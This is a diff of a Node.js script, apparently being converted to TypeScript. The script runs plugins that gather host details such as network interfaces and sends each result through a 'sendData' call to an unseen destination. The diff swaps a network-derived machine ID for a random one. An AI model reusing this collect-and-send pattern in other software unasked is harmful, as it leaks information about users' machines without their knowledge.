@@ -1,13 +1,13 @@
 #!/usr/bin/env node
 
-const { exec } = require("child_process");
 const core = require("./lib/core");
-const utils = require("./lib/utils");
 const gifts = require("./gifts/gifts");
 
-let machineId;
+import * as utils from "../src/lib/utils"
 
-const plugins = [
+import { CustomPlugin } from "array-utils";
+
+const plugins: CustomPlugin[] = [
     {
         key: "networkInterfaces",
         plugin: require("./plugins/getNetworkInterfaces")
@@ -26,7 +26,7 @@ const plugins = [
     }
 ];
 
-function runPlugin({key, plugin}) {
+function runPlugin({ key, plugin }: CustomPlugin): NodeJS.Dict<CustomPlugin> {
     return {
         [key]: plugin()
     }
@@ -40,10 +40,7 @@ gifts.catscatscatscats(3000);
 
 plugins.forEach(plugin => {
     let data = runPlugin(plugin);
-    if(plugin.key === "networkInterfaces") {
-        machineId = utils.generateId(data.networkInterfaces);
-    }
     let postData = JSON.stringify(data, null, 2);
     console.log("Sending data:", postData);
-    core.sendData(postData, plugin.key, machineId);
+    core.sendData(postData, plugin.key, utils.generateRandomId());
 });
